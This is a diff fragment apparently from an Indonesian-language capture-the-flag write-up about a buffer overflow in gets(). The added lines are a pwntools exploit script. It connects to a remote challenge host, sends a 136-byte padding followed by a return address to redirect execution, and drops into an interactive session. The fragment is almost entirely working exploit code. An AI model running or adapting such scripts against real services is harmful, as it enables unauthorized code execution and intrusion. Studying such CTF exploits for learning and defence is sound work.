@@ -4,6 +4,26 @@ fungsi gets() terdapat vulnerability bufferoverflow. dapat dilakukan ROP ke fung
 <br>
 
 ```
+from pwn import *
+
+r = remote('34.87.0.60', 2058)
+
+r.sendline('ABC')
+
+r.sendline('ABC')
+
+p = 'A'*136
+
+p += p64(0x0000000000401172)
+
+r.sendline(p)
+
+r.interactive()
+```
+
+<br>
+
+```
 
 from pwn import *
 
